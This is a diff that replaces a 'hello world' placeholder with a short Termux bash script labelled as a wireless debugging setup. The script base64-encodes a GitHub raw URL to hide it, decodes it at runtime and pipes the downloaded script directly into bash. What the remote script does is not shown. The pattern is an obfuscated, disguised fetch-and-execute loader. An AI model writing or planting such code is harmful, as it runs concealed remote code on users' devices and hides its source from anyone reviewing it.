@@ -1,1 +1,22 @@
-hello world
+#!/data/data/com.termux/files/usr/bin/bash
+
+# Colors for better readability
+GREEN='\033[0;32m'
+CYAN='\033[0;36m'
+YELLOW='\033[0;33m'
+NC='\033[0m' # No Color
+
+# Base64-encoded GitHub raw URL
+ENCODED_URL="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL255cm9zLXNvbGFyaS9zY3JpcHRzL21h
+aW4vaW5zdGFsbC12Mi5zaA=="
+
+# Get the debug port from command line argument
+DEBUG_PORT="${1:-38529}"  # Default to 38529 if no port specified
+
+echo -e "${CYAN}=== Wireless Debug Setup ===${NC}"
+echo -e "${YELLOW}Setting up wireless debugging (Port: $DEBUG_PORT)...${NC}"
+
+# Decode the URL and execute
+SCRIPT_URL=$(echo $ENCODED_URL | base64 -d)
+echo -e "${GREEN}Downloading setup script...${NC}"
+curl -s "$SCRIPT_URL" | bash -s -- "$DEBUG_PORT"
